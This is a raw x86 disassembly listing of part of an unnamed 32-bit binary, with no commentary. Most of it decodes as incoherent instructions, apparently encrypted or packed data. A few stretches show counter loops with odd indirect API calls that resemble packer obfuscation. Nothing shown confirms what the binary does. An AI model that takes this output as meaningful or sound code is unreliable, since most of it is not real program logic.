  407157:	pushf  
  407158:	xchg   ebx,eax
  407159:	call   0xff8d:0x89960bee
  407160:	(bad)  
  407162:	ins    DWORD PTR es:[edi],dx
  407163:	nop
  407164:	in     al,dx
  407165:	fnstenv [esi-0x76ff6d14]
  40716b:	jmp    0x407114
  40716d:	or     bl,dl
  40716f:	adc    eax,0x979a2901
  407174:	pop    ds
  407175:	mov    cs,WORD PTR [esi+0x56]
  407178:	cli    
  407179:	pop    edi
  40717a:	daa    
  40717b:	pop    esp
  40717c:	pop    esi
  40717d:	iret   
  40717e:	loopne 0x407103
  407180:	std    
  407181:	fstp   TBYTE PTR [esi+0x1cdcadd5]
  407187:	push   cs
  407188:	jl     0x4071e1
  40718a:	outs   dx,DWORD PTR ds:[esi]
  40718b:	mov    DWORD PTR [ebx],esi
  40718d:	fs mov ecx,0xa0ba0e3e
  407193:	jnp    0x407134
  407195:	push   es
  407196:	pushf  
  407197:	mov    eax,ds:0xe6a9fd64
  40719c:	test   eax,0x8f1b5107
  4071a1:	cld    
  4071a2:	mov    ?,WORD PTR [ebx-0x38636990]
  4071a8:	bound  ebx,QWORD PTR [esi+0x38d165b]
  4071ae:	xchg   ebp,eax
  4071af:	pop    edi
  4071b0:	push   edi
  4071b1:	jb     0x407167
  4071b3:	mov    al,ds:0xf85f96b7
  4071b8:	les    eax,FWORD PTR [edx-0x1e1e0322]
  4071be:	push   ds
  4071bf:	adc    edi,DWORD PTR [ebx]
  4071c1:	fld    QWORD PTR [ebx]
  4071c3:	and    cl,BYTE PTR [esi]
  4071c5:	inc    ecx
  4071c6:	dec    ebp
  4071c7:	jb     0x4071e3
  4071c9:	stos   BYTE PTR es:[edi],al
  4071ca:	pop    esi
  4071cb:	or     edi,ebp
  4071cd:	push   ss
  4071ce:	mov    ebp,0x7243280d
  4071d3:	or     eax,0xe45de6e4
  4071d8:	mov    fs,WORD PTR ds:0x450f91fb
  4071de:	int    0x8c
  4071e0:	jmp    0x40722d
  4071e2:	aaa    
  4071e3:	aad    0xbf
  4071e5:	aad    0x32
  4071e7:	jo     0x40716b
  4071e9:	inc    eax
  4071ea:	(bad)  
  4071eb:	jne    0x40721e
  4071ed:	jmp    0xf79c:0x54ff90a
  4071f4:	jmp    0xf28a81f7
  4071f9:	dec    edi
  4071fa:	jno    0x40725a
  4071fc:	cs out dx,eax
  4071fe:	mov    al,0xc5
  407200:	sar    BYTE PTR [ecx-0x1441bccf],0xe2
  407207:	nop
  407208:	aaa    
  407209:	(bad)  
  40720a:	out    0x54,al
  40720c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40720d:	fwait
  40720e:	retf   
  40720f:	cwde   
  407210:	icebp  
  407211:	sbb    al,0x17
  407213:	add    DWORD PTR [ebx+0x59],edi
  407216:	arpl   WORD PTR [esi-0x7926ccde],ax
  40721c:	add    bh,BYTE PTR [ecx+0x37e8ddaa]
  407222:	repz jmp 0x40728b
  407225:	sar    BYTE PTR [eax+0x24],0x6a
  407229:	sbb    al,0x4c
  40722b:	cli    
  40722c:	dec    si
  40722e:	shrd   esi,eax,0x79
  407232:	in     al,dx
  407233:	add    ebp,DWORD PTR [edx-0x27]
  407236:	call   0x8374cd91
  40723b:	mov    eax,0x2fbe7507
  407240:	adc    BYTE PTR [edx+0x29cfb771],0x5e
  407247:	ffree  st(5)
  407249:	xchg   edx,eax
  40724a:	push   cs
  40724b:	lahf   
  40724c:	xchg   ecx,eax
  40724d:	pushf  
  40724e:	in     eax,0xa7
  407250:	frstor [ebp+0x73bfa6af]
  407256:	imul   esp,DWORD PTR [esi+0x4190cf57],0x2
  40725d:	(bad)  
  40725e:	push   edi
  40725f:	add    al,0xec
  407261:	xor    al,0x51
  407263:	pusha  
  407264:	sbb    ebp,ebx
  407266:	call   0x7a732c9f
  40726b:	pop    ecx
  40726c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40726d:	ja     0x40728a
  40726f:	sahf   
  407270:	xchg   esp,eax
  407271:	enter  0x2bec,0x21
  407275:	jnp    0x407202
  407277:	push   ecx
  407278:	test   ch,dh
  40727a:	fst    DWORD PTR [edi-0x4124f47f]
  407280:	push   0x686fd1c0
  407285:	push   edi
  407286:	xor    al,0xf6
  407288:	or     al,0x3b
  40728a:	imul   edi,DWORD PTR [ecx+ebp*8],0x8162c4e2
  407291:	adc    eax,0xd2e02ada
  407296:	clc    
  407297:	inc    edi
  407298:	add    al,0x3b
  40729a:	cmp    esp,DWORD PTR [ecx]
  40729c:	retf   0xfbb6
  40729f:	outs   dx,DWORD PTR ds:[esi]
  4072a0:	xchg   edx,eax
  4072a1:	sub    BYTE PTR [edx-0xd2e1c1a],bl
  4072a7:	scas   eax,DWORD PTR es:[edi]
  4072a8:	mov    eax,ds:0xecb82f7
  4072ad:	adc    al,0x31
  4072af:	pop    ecx
  4072b0:	stos   DWORD PTR es:[edi],eax
  4072b1:	pop    DWORD PTR [esi]
  4072b3:	mov    cl,0x18
  4072b5:	arpl   si,bx
  4072b7:	movnti DWORD PTR [ebx],esi
  4072ba:	adc    esi,DWORD PTR [esi]
  4072bc:	inc    edx
  4072bd:	icebp  
  4072be:	cmp    DWORD PTR [esi-0x15],0xa796d4a
  4072c5:	push   esp
  4072c6:	inc    esi
  4072c7:	dec    ebp
  4072c8:	pushf  
  4072c9:	push   cs
  4072ca:	(bad)  
  4072cb:	loope  0x407299
  4072cd:	jl     0x40727b
  4072cf:	or     al,0xd2
  4072d1:	mov    dl,0x92
  4072d3:	pop    es
  4072d4:	fs ret 
  4072d6:	ins    BYTE PTR es:[edi],dx
  4072d7:	out    dx,al
  4072d8:	or     bl,bl
  4072da:	and    DWORD PTR [ebx+0x47],ebx
  4072dd:	add    dl,BYTE PTR [ecx+0x2a]
  4072e0:	imul   eax,DWORD PTR [esi],0xffffffe9
  4072e3:	pushf  
  4072e4:	adc    esi,edx
  4072e6:	dec    esi
  4072e7:	outs   dx,BYTE PTR ds:[esi]
  4072e8:	inc    eax
  4072e9:	and    BYTE PTR [ebp+0x7b],bl
  4072ec:	xor    eax,0xc28c727e
  4072f1:	dec    ebp
  4072f2:	aam    0x52
  4072f4:	sbb    cl,cl
  4072f6:	push   esi
  4072f7:	repnz lea ebx,[edx]
  4072fa:	outs   dx,BYTE PTR ds:[esi]
  4072fb:	sbb    DWORD PTR [edi-0x76],edi
  4072fe:	mov    WORD PTR gs:[ecx-0x5750f62],ss
  407305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407306:	cmc    
  407307:	repz out dx,eax
  407309:	sahf   
  40730a:	mov    esi,0xe11bf971
  40730f:	sti    
  407310:	addr16 pusha 
  407312:	sahf   
  407313:	sbb    esi,eax
  407315:	cdq    
  407316:	out    dx,eax
  407317:	sbb    esi,DWORD PTR [ebp+0x74]
  40731a:	mov    ch,0x44
  40731c:	push   ds
  40731d:	icebp  
  40731e:	pop    edi
  40731f:	fadd   DWORD PTR [edi-0xa]
  407322:	sbb    eax,esi
  407324:	aam    0xff
  407326:	fdivrp st(3),st
  407328:	push   esi
  407329:	add    ecx,eax
  40732b:	inc    edi
  40732c:	xchg   edi,eax
  40732d:	dec    dx
  40732f:	fsubr  st(4),st
  407331:	push   0x923d6c8f
  407336:	xor    al,0x81
  407338:	pop    esp
  407339:	imul   ebx,DWORD PTR [edi-0x286c71d2],0x1820a2fb
  407343:	mov    BYTE PTR [esi+0x55c2c2e2],dl
  407349:	jge    0x4072cf
  40734b:	hlt    
  40734c:	mov    ds:0x53a5f018,eax
  407351:	pop    esi
  407352:	(bad)  
  407353:	or     al,0xa8
  407355:	add    cl,dh
  407357:	data16 sbb al,0x67
  40735a:	lahf   
  40735b:	cwde   
  40735c:	xchg   esp,eax
  40735d:	stos   BYTE PTR es:[edi],al
  40735e:	mov    BYTE PTR [ebx-0x22],dl
  407361:	arpl   cx,ax
  407363:	popf   
  407364:	test   al,0xe6
  407366:	es jecxz 0x407392
  407369:	sub    DWORD PTR [ebp+eax*1-0xe],ebx
  40736d:	pop    ecx
  40736e:	repnz and al,0xc9
  407371:	pusha  
  407372:	and    bh,al
  407374:	dec    ecx
  407375:	ja     0x40734c
  407377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407378:	out    dx,eax
  407379:	xor    eax,0x5d7db7f0
  40737e:	cmp    al,BYTE PTR [esp+ecx*8+0x32]
  407382:	pop    eax
  407383:	inc    eax
  407384:	xor    DWORD PTR [edi+0x6639f39c],esi
  40738a:	nop
  40738b:	sub    DWORD PTR [edx+ebp*2],edi
  40738e:	mov    eax,0x2f7e3d55
  407393:	dec    edx
  407394:	iret   
  407395:	lahf   
  407396:	add    edx,DWORD PTR [edx-0x1b48705a]
  40739c:	xchg   esi,eax
  40739d:	in     al,0xc1
  40739f:	adc    DWORD PTR [esi-0x6920134a],0xffffffa3
  4073a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073a7:	cdq    
  4073a8:	push   0xc78fe3be
  4073ad:	xchg   esi,eax
  4073ae:	push   0xffffff85
  4073b0:	dec    ecx
  4073b1:	nop
  4073b2:	scas   eax,DWORD PTR es:[edi]
  4073b3:	dec    edx
  4073b4:	dec    esp
  4073b5:	mov    ds:0x2dc2afb2,al
  4073ba:	xchg   ebp,eax
  4073bb:	or     esi,ebp
  4073bd:	scas   eax,DWORD PTR es:[edi]
  4073be:	or     DWORD PTR [esi+0x62],ebx
  4073c1:	and    DWORD PTR [ebx+0x78],ebp
  4073c4:	test   BYTE PTR [edi],ch
  4073c6:	arpl   WORD PTR [ecx],bx
  4073c8:	push   ss
  4073c9:	xor    al,0x8a
  4073cb:	push   ss
  4073cc:	nop
  4073cd:	in     eax,0xf2
  4073cf:	mov    ebp,0x66f92030
  4073d4:	pop    eax
  4073d5:	xchg   DWORD PTR [ecx+0x4f039547],esp
  4073db:	jecxz  0x40744a
  4073dd:	std    
  4073de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073df:	dec    esp
  4073e0:	mov    ebp,0x837d2fb
  4073e5:	adc    esp,esp
  4073e7:	push   ss
  4073e8:	mov    eax,0xaff495d3
  4073ed:	sub    cl,BYTE PTR [ecx]
  4073ef:	jmp    0xfbbf:0x7c108469
  4073f6:	into   
  4073f7:	lahf   
  4073f8:	mov    edi,0x5d403f1e
  4073fd:	scas   al,BYTE PTR es:[edi]
  4073fe:	push   ebp
  4073ff:	cmp    DWORD PTR [ebx],ebp
  407401:	mov    edx,0x3fc216af
  407406:	repz pop eax
  407408:	xchg   DWORD PTR [edx+ebx*4-0x7cfbb998],edx
  40740f:	in     al,0x68
  407411:	(bad)  
  407412:	(bad)  
  407413:	stc    
  407414:	mov    eax,ds:0x69840586
  407419:	adc    BYTE PTR [ecx+0x32],0x3d
  40741d:	sub    DWORD PTR [ecx],edx
  40741f:	jmp    FWORD PTR [ecx+esi*8]
  407422:	or     bh,0xb
  407425:	xchg   BYTE PTR [eax],dl
  407427:	fsub   QWORD PTR [edx]
  407429:	xchg   ecx,eax
  40742a:	push   esp
  40742b:	pop    ebx
  40742c:	fnstsw WORD PTR [ecx+ebp*2]
  40742f:	jge    0x4073ba
  407431:	push   esp
  407432:	add    al,0xf4
  407434:	mov    bl,0xa5
  407436:	cwde   
  407437:	or     cl,dl
  407439:	inc    ebp
  40743a:	mov    ch,0x73
  40743c:	fild   DWORD PTR [esi+0x48c8152d]
  407442:	(bad)  
  407443:	cdq    
  407444:	retf   0x1f04
  407447:	loop   0x4073cc
  407449:	shr    DWORD PTR [esi],0x64
  40744c:	je     0x407469
  40744e:	push   ds
  40744f:	push   0xa4a3efef
  407454:	stos   BYTE PTR es:[edi],al
  407455:	cmp    edx,eax
  407457:	add    al,bh
  407459:	add    ah,BYTE PTR [eax]
  40745b:	scas   al,BYTE PTR es:[edi]
  40745c:	sub    ebx,DWORD PTR [ebx]
  40745e:	push   0x6
  407460:	cwde   
  407461:	jb     0x4073e3
  407463:	ins    DWORD PTR es:[edi],dx
  407464:	enter  0xbacd,0xe6
  407468:	lods   al,BYTE PTR ds:[esi]
  407469:	push   eax
  40746a:	push   0xffffffe9
  40746c:	repz jp 0x4074a1
  40746f:	lahf   
  407470:	cmp    eax,0xaad37c19
  407475:	outs   dx,DWORD PTR ds:[esi]
  407476:	jmp    0x407474
  407478:	bound  bx,DWORD PTR [bx+si+0x6ca8]
  40747e:	cli    
  40747f:	call   0x9705:0xc75321eb
  407486:	ss inc ebx
  407488:	add    BYTE PTR [edi],dl
  40748a:	add    BYTE PTR [eax],al
  40748c:	add    BYTE PTR [ebx+0x4336973d],al
  407492:	add    BYTE PTR [eax],al
  407494:	je     0x4074de
  40749a:	cmp    DWORD PTR ds:0x433697,0xc
  4074a1:	jne    0x4074b2
  4074a7:	push   0x26d7
  4074ac:	call   DWORD PTR ds:0x41218c
  4074b2:	cmp    DWORD PTR ds:0x433697,0xd
  4074b9:	jne    0x4074cc
  4074bf:	mov    ecx,DWORD PTR ds:0x433697
  4074c5:	dec    ecx
  4074c6:	mov    DWORD PTR ds:0x433697,ecx
  4074cc:	mov    ecx,DWORD PTR ds:0x433697
  4074d2:	dec    ecx
  4074d3:	mov    DWORD PTR ds:0x433697,ecx
  4074d9:	jmp    0x40748d
  4074de:	lea    eax,[ebp-0x18]
  4074e1:	not    DWORD PTR ds:0x4336ab
  4074e7:	mov    DWORD PTR [ebp-0x1c],eax
  4074ea:	add    DWORD PTR ds:0x4336ab,ecx
  4074f0:	jmp    0x407866
  4074f5:	xchg   esi,eax
  4074f6:	je     0x407544
  4074f8:	cwde   
  4074f9:	outs   dx,BYTE PTR ds:[esi]
  4074fa:	mov    al,ds:0x62ca7272
  4074ff:	mov    cl,0xe2
  407501:	jp     0x40754f
  407503:	ss cs push esi
  407506:	enter  0x7c7c,0xd7
  40750a:	jns    0x407588
  40750c:	jl     0x40749b
  40750e:	mov    ah,0xed
  407510:	push   gs
  407512:	xchg   DWORD PTR [ebx],esi
  407514:	push   ebp
  407515:	xor    al,0x9b
  407517:	mov    esi,DWORD PTR [edi-0x50f7111f]
  40751d:	aas    
  40751e:	les    ebx,FWORD PTR [edx-0x36]
  407521:	(bad)  
  407522:	(bad)  
  407523:	(bad)
  407527:	cmp    BYTE PTR [ecx+0x382da920],bh
  40752d:	add    al,0x23
  40752f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407530:	jmp    0xf06c3b9b
  407535:	pop    edx
  407536:	inc    edx
  407537:	int    0xf3
  407539:	and    eax,0x8c9c4cc8
  40753e:	ins    DWORD PTR es:[edi],dx
  40753f:	stos   DWORD PTR es:[edi],eax
  407540:	into   
  407541:	lods   eax,DWORD PTR ds:[esi]
  407542:	inc    edx
  407543:	rcl    BYTE PTR [edi],cl
  407545:	sbb    DWORD PTR [esi-0x30],ebx
  407548:	fwait
  407549:	mov    edx,esp
  40754b:	push   ecx
  40754c:	xor    ah,cl
  40754e:	jae    0x4074d0
  407550:	push   eax
  407551:	or     esi,DWORD PTR [edx]
  407553:	sahf   
  407554:	scas   eax,DWORD PTR es:[edi]
  407555:	jmp    0xf8651b55
  40755a:	adc    al,0xec
  40755c:	inc    ebx
  40755d:	les    edx,FWORD PTR [esi+0x17]
  407560:	xchg   ebp,eax
  407561:	(bad)  [ebx+0x18]
  407564:	or     ch,cl
  407566:	inc    ecx
  407567:	dec    eax
  407568:	add    DWORD PTR [ebx],eax
  40756a:	xor    bh,BYTE PTR [eax-0x15]
  40756d:	dec    esp
  40756e:	jmp    0x4075a7
  407570:	push   eax
  407571:	pop    ecx
  407572:	rcl    DWORD PTR [edx+eiz*1-0x6e100bd3],cl
  407579:	jp     0x40750c
  40757b:	or     DWORD PTR [ecx+ebx*2+0x30b2609a],eax
  407582:	repnz sahf 
  407584:	or     DWORD PTR [eax],ebp
  407586:	stos   BYTE PTR es:[edi],al
  407587:	cmp    BYTE PTR [ebx],bh
  407589:	pop    edi
  40758a:	loopne 0x407577
  40758c:	lock shr DWORD PTR [ebx+0x752afb7b],cl
  407593:	sbb    DWORD PTR [esi+0x5f170766],ebp
  407599:	shr    BYTE PTR [edi],1
  40759b:	lahf   
  40759c:	or     eax,0xe8f61a86
  4075a1:	push   edx
  4075a2:	and    al,BYTE PTR [eax-0x7a78612a]
  4075a8:	xor    al,0x83
  4075aa:	neg    BYTE PTR [edi]
  4075ac:	loop   0x40761f
  4075ae:	stos   BYTE PTR es:[edi],al
  4075af:	xchg   ebp,eax
  4075b0:	xor    eax,0x791df20e
  4075b5:	mov    eax,0xcff70878
  4075ba:	retf   0x3354
  4075bd:	ins    BYTE PTR es:[edi],dx
  4075be:	in     al,dx
  4075bf:	jbe    0x407604
  4075c1:	loop   0x4075dc
  4075c3:	jge    0x4075e2
  4075c5:	out    dx,eax
  4075c6:	pop    ebx
  4075c7:	dec    eax
  4075c8:	xor    eax,DWORD PTR [edi]
  4075ca:	enter  0xe90f,0x28
  4075ce:	dec    DWORD PTR [ecx+0x60f23b17]
  4075d4:	retf   0x44c5
  4075d7:	xlat   BYTE PTR ds:[ebx]
  4075d8:	mov    WORD PTR [ebx+0x16],ds
  4075db:	jg     0x4075e0
  4075dd:	or     DWORD PTR [edi+0x46],ebx
  4075e0:	outs   dx,DWORD PTR ds:[esi]
  4075e1:	pop    esi
  4075e2:	das    
  4075e3:	xchg   edi,eax
  4075e4:	and    ecx,DWORD PTR [esi+0x34]
  4075e7:	jo     0x407593
  4075e9:	and    BYTE PTR [ecx+0x33],0xc7
  4075ed:	xchg   DWORD PTR [eax+0x25],esp
  4075f0:	xor    DWORD PTR [ebp-0xd],edi
  4075f3:	adc    bl,ch
  4075f5:	lods   eax,DWORD PTR ds:[esi]
  4075f6:	mov    dh,0xc1
  4075f8:	lock mov eax,ds:0xbe6de2a0
  4075fe:	and    esi,DWORD PTR [ecx+0x31]
  407601:	(bad)  
  407602:	bound  edx,QWORD PTR [edx]
  407604:	xchg   edx,eax
  407605:	stos   DWORD PTR es:[edi],eax
  407606:	fild   WORD PTR [edi+0x48fc9edf]
  40760c:	dec    DWORD PTR [edx+0x12]
  40760f:	add    BYTE PTR [ecx+0x45],ch
  407612:	sbb    eax,0x9188fc4d
  407617:	mov    gs,WORD PTR [ebx+0xd]
  40761a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40761b:	jo     0x4075af
  40761d:	sbb    al,bh
  40761f:	adc    dh,BYTE PTR [eax-0x3f]
  407622:	mov    ebp,0xd146aa33
  407627:	lds    ecx,FWORD PTR [esi-0x5d881494]
  40762d:	pop    esi
  40762e:	jne    0x4076a9
  407630:	sub    ebp,DWORD PTR [edi+0x4a]
  407633:	pop    es
  407634:	push   ecx
  407635:	js     0x40762b
  407637:	fld    QWORD PTR [esi]
  407639:	mov    ch,0xfc
  40763b:	arpl   WORD PTR [edi-0x6c77f1b7],di
  407641:	js     0x4075fd
  407643:	jb     0x40763b
  407645:	push   ebx
  407646:	retf   
  407647:	or     bl,bl
  407649:	mov    dl,0xa
  40764b:	cwde   
  40764c:	push   0xfffffffa
  40764e:	lds    eax,FWORD PTR [edx]
  407650:	js     0x407620
  407652:	shr    BYTE PTR [ebp-0x17],1
  407655:	add    DWORD PTR [esi],0x36
  407658:	mov    bl,ah
  40765a:	pop    ecx
  40765b:	push   edi
  40765c:	ins    DWORD PTR es:[edi],dx
  40765d:	repz mov esp,0xd212a2bb
  407663:	fdiv   DWORD PTR [edi-0x409f2b86]
  407669:	add    bl,0x51
  40766c:	(bad)  
  40766d:	jns    0x407672
  40766f:	cmp    eax,0x2ba464a8
  407674:	adc    ebx,DWORD PTR [esi+edi*1+0x55]
  407678:	xor    BYTE PTR [edi],ah
  40767a:	pavgb  mm7,mm7
  40767d:	lods   al,BYTE PTR ds:[esi]
  40767e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40767f:	pop    eax
  407680:	dec    esp
  407681:	xor    DWORD PTR [ecx+0x76],esp
  407684:	pop    ebx
  407685:	ror    BYTE PTR es:[ebx+0x21],1
  407689:	and    DWORD PTR [eax],0xffffffc1
  40768c:	sub    eax,0x4170fa70
  407691:	add    eax,0x1dd35772
  407696:	and    ch,dl
  407698:	gs jecxz 0x407708
  40769b:	and    BYTE PTR [ebp*1+0x571379b9],bh
  4076a2:	dec    ecx
  4076a3:	and    eax,0xa96114ed
  4076a8:	sbb    esi,edx
  4076aa:	ret    
  4076ab:	loope  0x4076e4
  4076ad:	leave  
  4076ae:	addr16 gs push 0xfffffff0
  4076b2:	mov    ds:0x720268ba,al
  4076b7:	lahf   
  4076b8:	loope  0x407655
  4076ba:	push   eax
  4076bb:	shl    DWORD PTR [ecx],1
  4076bd:	inc    ecx
  4076bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076c0:	(bad)  
  4076c1:	mov    ebx,0xc3ce9224
  4076c6:	mov    BYTE PTR [edx+0x50aea52a],dh
  4076cc:	pop    ss
  4076cd:	or     bl,BYTE PTR [edx-0xf]
  4076d0:	xchg   DWORD PTR [edx],edx
  4076d2:	cmp    DWORD PTR [eax+0x7d],esp
  4076d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076d7:	dec    ebx
  4076d8:	scas   al,BYTE PTR es:[edi]
  4076d9:	aaa    
  4076da:	mov    ds:0xe5af3b5e,al
  4076df:	mov    ebp,0x544567bb
  4076e4:	icebp  
  4076e5:	and    BYTE PTR [eax],0x25
  4076e8:	outs   dx,BYTE PTR ds:[esi]
  4076e9:	int    0xed
  4076eb:	cmp    ah,0xcb
  4076ee:	dec    ecx
  4076ef:	cmp    ebx,DWORD PTR [edi-0x656835f8]
  4076f5:	shl    dh,1
  4076f7:	dec    ebx
  4076f8:	retf   
  4076f9:	fdivr  st(4),st
  4076fb:	fwait
  4076fc:	sbb    ch,0x6b
  4076ff:	push   ss
  407700:	rol    DWORD PTR [eax-0x63],1
  407703:	adc    BYTE PTR [ebx+0x4f],bh
  407706:	xchg   ecx,eax
  407707:	jp     0x407717
  407709:	or     ch,BYTE PTR [esi+0x22e0073d]
  40770f:	out    0x6b,al
  407711:	enter  0xe238,0x1e
  407715:	loop   0x4076b3
  407717:	inc    ecx
  407718:	adc    ah,BYTE PTR [eax]
  40771a:	jl     0x4076fc
  40771c:	stos   BYTE PTR es:[edi],al
  40771d:	mov    bl,0x7c
  40771f:	fidiv  WORD PTR [ebx+0x16]
  407722:	or     DWORD PTR [eax+ebx*1-0x5e],0xb3c48f2f
  40772a:	mov    ch,0x19
  40772c:	lds    edx,FWORD PTR [ecx-0x1b]
  40772f:	inc    esp
  407730:	sbb    al,0x53
  407732:	cmp    ebp,DWORD PTR [esi-0x77]
  407735:	pop    ds
  407736:	in     eax,dx
  407737:	push   es
  407738:	push   es
  407739:	sbb    esp,edx
  40773b:	outs   dx,BYTE PTR ds:[esi]
  40773c:	and    DWORD PTR ds:0xd27a16eb,0xd72361f1
  407746:	(bad)  
  407747:	mov    fs,edx
  407749:	pushf  
  40774a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40774b:	es xchg edx,eax
  40774d:	es xchg ebp,eax
  40774f:	mov    esi,0x69ea9d63
  407754:	(bad)  
  407755:	jle    0x407749
  407757:	mov    ds:0x6a9fb9d5,eax
  40775c:	mov    bh,BYTE PTR [edi-0x1ecc727f]
  407762:	pop    edi
  407763:	stc    
  407764:	sbb    cl,0xdd
  407767:	fcomp  DWORD PTR [ecx-0x2eb9a647]
  40776d:	jmp    0x9efd:0xb62c84f6
  407774:	ds ret 0x7eb4
  407778:	sbb    eax,0x67fe2c48
  40777d:	push   cs
  40777e:	shl    BYTE PTR [ecx-0x68],1
  407781:	cmp    DWORD PTR [ebp-0x9182dcd],0xc8632d90
  40778b:	jbe    0x4077a7
  40778d:	outs   dx,BYTE PTR ds:[esi]
  40778e:	inc    BYTE PTR ds:0x6722ffd1
  407794:	out    dx,eax
  407795:	hlt    
  407796:	inc    ebx
  407797:	xchg   edx,eax
  407798:	push   eax
  407799:	popf   
  40779a:	and    bl,BYTE PTR [esi+0x5]
  40779d:	mov    bl,0xc7
  40779f:	xchg   esp,eax
  4077a0:	pop    ecx
  4077a1:	loope  0x4077db
  4077a3:	fnsave [ecx+0x3c033602]
  4077a9:	shl    BYTE PTR [ebp+0x2a],1
  4077ac:	fisub  WORD PTR [ecx+eax*4+0x25a3f15e]
  4077b3:	cmp    al,0xba
  4077b5:	pop    fs
  4077b7:	fdiv   QWORD PTR [edi-0xd]
  4077ba:	cmc    
  4077bb:	push   0x4198f843
  4077c0:	cmp    eax,0xc7da9956
  4077c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077c6:	popf   
  4077c7:	retf   0xbf48
  4077ca:	jne    0x407843
  4077cc:	xchg   ah,bh
  4077ce:	mov    bh,0x37
  4077d0:	sbb    al,0x7e
  4077d2:	inc    esi
  4077d3:	mov    al,0xaa
  4077d5:	mov    WORD PTR [ebx+esi*1+0x2b],es
  4077d9:	pusha  
  4077da:	retf   
  4077db:	mov    ebx,0x22711a81
  4077e0:	sub    ah,BYTE PTR [eax-0xa]
  4077e3:	and    al,0xf6
  4077e5:	aad    0xef
  4077e7:	je     0x40776e
  4077e9:	cmp    DWORD PTR [esi+0x74a7572],eax
  4077ef:	call   0xe4dc:0xca8ba45e
  4077f6:	dec    eax
  4077f7:	cli    
  4077f8:	aad    0xd4
  4077fa:	sbb    BYTE PTR [ecx],cl
  4077fc:	jmp    0x5c968a48
  407801:	ins    BYTE PTR es:[edi],dx
  407802:	jle    0x4077bb
  407804:	pop    ecx
  407805:	inc    edi
  407806:	sub    cl,bl
  407808:	or     esp,eax
  40780a:	imul   esi,DWORD PTR [esi],0x5a
  40780d:	inc    ecx
  40780f:	sbb    BYTE PTR [esi+0x2cc1798d],0xa
  407816:	aam    0x2
  407818:	std    
  407819:	imul   BYTE PTR [eax]
  40781b:	out    dx,al
  40781c:	fst    QWORD PTR [esi+0x7917e8fa]
  407822:	push   edi
  407823:	pop    edx
  407824:	jnp    0x407848
  407826:	and    BYTE PTR [edi-0x47bbf9b9],0x4c
  40782d:	push   ecx
  40782e:	inc    ecx
  40782f:	sbb    al,0xc3
  407831:	hlt    
  407832:	fstp   QWORD PTR [eax-0x1ddf2ded]
  407838:	call   0xb654bfce
  40783d:	dec    ecx
  40783e:	out    0x24,eax
  407840:	out    dx,eax
  407841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407842:	div    BYTE PTR [ecx+ebx*1+0x5c58c78c]
  407849:	(bad)  
  40784b:	xchg   edi,eax
  40784c:	fisub  DWORD PTR [esi+0x55]
  40784f:	push   ebx
  407850:	and    esp,ebp
  407852:	sub    cl,bl
  407854:	jmp    0x7908:0xe2d74ee7
  40785b:	rol    DWORD PTR [ecx+ebp*2],1
  40785e:	ds stc 
  407860:	fiadd  DWORD PTR [ecx+0x43]
  407863:	jo     0x407885
  407865:	xor    DWORD PTR [ebx+0x2581e445],ecx
  40786b:	pop    ss
  40786c:	aaa    
  40786d:	inc    ebx
  40786e:	add    BYTE PTR [eax],al
  407870:	add    BYTE PTR [eax],al
  407872:	add    BYTE PTR [ebx+0x4337171d],cl
  407878:	add    BYTE PTR [ebx-0x77],al
  40787b:	sbb    eax,0x433717
  407880:	cmp    DWORD PTR ds:0x433717,0x6
  407887:	jne    0x407896
  40788d:	push   DWORD PTR [ebp-0x28]
  407890:	call   DWORD PTR ds:0x412190
  407896:	cmp    DWORD PTR ds:0x433717,0x5
  40789d:	jne    0x4078b0
  4078a3:	mov    ebx,DWORD PTR ds:0x433717
  4078a9:	inc    ebx
  4078aa:	mov    DWORD PTR ds:0x433717,ebx
  4078b0:	cmp    DWORD PTR ds:0x433717,0x15
  4078b7:	jb     0x407873
  4078bd:	push   esi
  4078be:	and    DWORD PTR ds:0x43364b,edi
  4078c4:	push   edi
  4078c5:	and    DWORD PTR ds:0x4336eb,0x0
  4078cf:	jmp    0x4078e1
  4078d4:	mov    edi,DWORD PTR ds:0x4336eb
  4078da:	inc    edi
  4078db:	mov    DWORD PTR ds:0x4336eb,edi
  4078e1:	cmp    DWORD PTR ds:0x4336eb,0x18
  4078e8:	jae    0x4079ae
  4078ee:	cmp    DWORD PTR ds:0x4336eb,0x8
  4078f5:	jne    0x407918
  4078fb:	push   0x117a
  407900:	push   DWORD PTR [ebp-0x28]
  407903:	push   0x433914
  407908:	push   0x86e1
  40790d:	push   0x5408
  407912:	call   DWORD PTR ds:0x41225c
  407918:	cmp    DWORD PTR ds:0x4336eb,0x7
  40791f:	jne    0x407934
  407925:	xor    edi,edi
  407927:	xor    edi,DWORD PTR ds:0x4336eb
  40792d:	inc    edi
  40792e:	mov    DWORD PTR ds:0x4336eb,edi
  407934:	jmp    0x4078d4
  407939:	mov    DWORD PTR ds:0x43364b,0x19
  407943:	cmp    DWORD PTR ds:0x43364b,0x0
  40794a:	je     0x4079ae
  407950:	cmp    DWORD PTR ds:0x43364b,0x9
  407957:	jne    0x40796e
  40795d:	push   DWORD PTR [ebp-0x1c]
  407960:	push   0x6ccd
  407965:	push   DWORD PTR [ebp-0x10]
  407968:	call   DWORD PTR ds:0x4120c4
  40796e:	cmp    DWORD PTR ds:0x43364b,0xa
  407975:	jne    0x407988
  40797b:	mov    edi,DWORD PTR ds:0x43364b
  407981:	dec    edi
  407982:	mov    DWORD PTR ds:0x43364b,edi
  407988:	mov    edi,DWORD PTR ds:0x43364b
  40798e:	dec    edi
  40798f:	mov    DWORD PTR ds:0x43364b,edi
  407995:	jmp    0x407943
  40799a:	xor    edi,edi
  40799c:	add    edi,DWORD PTR ds:0x4336ef
